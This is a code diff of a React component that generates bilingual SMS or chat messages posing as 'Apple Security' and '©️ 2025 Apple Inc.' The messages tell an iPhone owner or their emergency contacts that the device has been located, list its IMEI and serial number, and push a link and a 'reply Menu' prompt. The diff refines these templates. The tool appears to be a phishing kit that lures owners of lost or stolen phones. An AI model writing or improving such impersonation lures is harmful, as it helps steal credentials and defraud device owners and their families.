@@ -264,33 +264,30 @@ const ProcessList: React.FC<ProcessListProps> = ({ userType }) => {
       
       if (language === 'spanish') {
         if (process.contact_type === 'propietario') {
-          // Mensaje para propietario
+          // Mensaje para propietario - VERSION OPTIMIZADA
           message = `🚨 ¡ALERTA URGENTE!
 
-🔍 Tu iPhone fue detectado el **${formatDate(delayedTime, 'spanish')} a las ${formatTime(delayedTime)}** tras haberse conectado a internet.  
+🔍 Tu iPhone fue detectado el **${formatDate(delayedTime, 'spanish')} a las ${formatTime(delayedTime)}** tras haberse conectado a internet.
 💡 Esto indica que el dispositivo **está activo y ha sido localizado con éxito**.
 
-📌 Este mensaje ha sido enviado automáticamente como **aviso prioritario al número registrado en el sistema**.
+📌 Mensaje automático enviado como **aviso prioritario al número registrado**.
 
-👤 Propietario: ${process.owner_name || 'No especificado'}  
-📱 Modelo: ${process.iphone_model}  
-🎨 Color: ${process.color}  
-💾 Almacenamiento: ${process.storage}  
-📟 IMEI: ${process.imei}  
-🔑 Número de serie: ${process.serial_number}  
-🔋 Batería: ${battery}%  
-🕓 Última detección: Hace 2 horas
+👤 Propietario: ${process.owner_name || 'No especificado'}
+📱 Modelo: ${process.iphone_model}
+🎨 Color: ${process.color}
+💾 Almacenamiento: ${process.storage}
+📟 IMEI: ${process.imei}
+🔑 Número de serie: ${process.serial_number}
+🔋 Batería: ${battery}%
 
 ${process.url ? `🌍 Ver estado del dispositivo: ${process.url}` : ''}
 
 📬 ¿Eres el dueño? 👉 *Responde con* **Menú** para recibir ayuda inmediata del equipo de soporte técnico 👨🏽‍🔧
 
-⏳ *Estamos rastreando el equipo en tiempo real para proteger tu información.*
-
-🛡️ Apple Security – Servicio activo 24/7  
+🛡️ Apple Security – Servicio activo 24/7
 ©️ 2025 Apple Inc.`;
         } else {
-          // Mensaje para contacto de emergencia
+          // Mensaje para contacto de emergencia - VERSION OPTIMIZADA
           message = `🚨 ¡DISPOSITIVO LOCALIZADO!
 
 📱 El iPhone de **${process.owner_name || 'usuario registrado'}** ha sido detectado el **${formatDate(delayedTime, 'spanish')} a las ${formatTime(delayedTime)}**.
@@ -298,13 +295,12 @@ ${process.url ? `🌍 Ver estado del dispositivo: ${process.url}` : ''}
 ⚠️ **Mensaje automático enviado a contactos de emergencia registrados**
 
 🔍 **Estado del dispositivo:**
-📱 Modelo: ${process.iphone_model}  
-🎨 Color: ${process.color}  
-💾 Almacenamiento: ${process.storage}  
-📟 IMEI: ${process.imei}  
-🔑 Serie: ${process.serial_number}  
-🔋 Batería: ${battery}%  
-🕓 Última conexión: Hace 2 horas
+📱 Modelo: ${process.iphone_model}
+🎨 Color: ${process.color}
+💾 Almacenamiento: ${process.storage}
+📟 IMEI: ${process.imei}
+🔑 Serie: ${process.serial_number}
+🔋 Batería: ${battery}%
 
 ${process.url ? `🌍 Ver ubicación en tiempo real: ${process.url}` : ''}
 
@@ -314,39 +310,36 @@ ${process.url ? `🌍 Ver ubicación en tiempo real: ${process.url}` : ''}
 
 📬 Para asistencia inmediata 👉 *Responde* **Menú**
 
-🛡️ Apple Security – Sistema de emergencia  
+🛡️ Apple Security – Sistema de emergencia
 ©️ 2025 Apple Inc.`;
         }
       } else {
-        // Mensajes en inglés
+        // Mensajes en inglés - VERSION OPTIMIZADA
         if (process.contact_type === 'propietario') {
-          // Owner message in English
+          // Owner message in English - OPTIMIZED VERSION
           message = `🚨 URGENT ALERT!
 
-🔍 Your iPhone was detected on **${formatDate(delayedTime, 'english')} at ${formatTime(delayedTime)}** after connecting to the internet.  
+🔍 Your iPhone was detected on **${formatDate(delayedTime, 'english')} at ${formatTime(delayedTime)}** after connecting to the internet.
 💡 This indicates that the device **is active and has been successfully located**.
 
-📌 This message has been sent automatically as a **priority notice to the registered number**.
+📌 Automatic message sent as a **priority notice to the registered number**.
 
-👤 Owner: ${process.owner_name || 'Not specified'}  
-📱 Model: ${process.iphone_model}  
-🎨 Color: ${process.color}  
-💾 Storage: ${process.storage}  
-📟 IMEI: ${process.imei}  
-🔑 Serial number: ${process.serial_number}  
-🔋 Battery: ${battery}%  
-🕓 Last detection: 2 hours ago
+👤 Owner: ${process.owner_name || 'Not specified'}
+📱 Model: ${process.iphone_model}
+🎨 Color: ${process.color}
+💾 Storage: ${process.storage}
+📟 IMEI: ${process.imei}
+🔑 Serial number: ${process.serial_number}
+🔋 Battery: ${battery}%
 
 ${process.url ? `🌍 View device status: ${process.url}` : ''}
 
 📬 Are you the owner? 👉 *Reply with* **Menu** to receive immediate help from technical support team 👨🏽‍🔧
 
-⏳ *We are tracking the device in real time to protect your information.*
-
-🛡️ Apple Security – 24/7 active service  
+🛡️ Apple Security – 24/7 active service
 ©️ 2025 Apple Inc.`;
         } else {
-          // Emergency contact message in English
+          // Emergency contact message in English - OPTIMIZED VERSION
           message = `🚨 DEVICE LOCATED!
 
 📱 The iPhone belonging to **${process.owner_name || 'registered user'}** was detected on **${formatDate(delayedTime, 'english')} at ${formatTime(delayedTime)}**.
@@ -354,13 +347,12 @@ ${process.url ? `🌍 View device status: ${process.url}` : ''}
 ⚠️ **Automatic message sent to registered emergency contacts**
 
 🔍 **Device status:**
-📱 Model: ${process.iphone_model}  
-🎨 Color: ${process.color}  
-💾 Storage: ${process.storage}  
-📟 IMEI: ${process.imei}  
-🔑 Serial: ${process.serial_number}  
-🔋 Battery: ${battery}%  
-🕓 Last connection: 2 hours ago
+📱 Model: ${process.iphone_model}
+🎨 Color: ${process.color}
+💾 Storage: ${process.storage}
+📟 IMEI: ${process.imei}
+🔑 Serial: ${process.serial_number}
+🔋 Battery: ${battery}%
 
 ${process.url ? `🌍 View real-time location: ${process.url}` : ''}
 
@@ -370,7 +362,7 @@ ${process.url ? `🌍 View real-time location: ${process.url}` : ''}
 
 📬 For immediate assistance 👉 *Reply* **Menu**
 
-🛡️ Apple Security – Emergency system  
+🛡️ Apple Security – Emergency system
 ©️ 2025 Apple Inc.`;
         }
       }
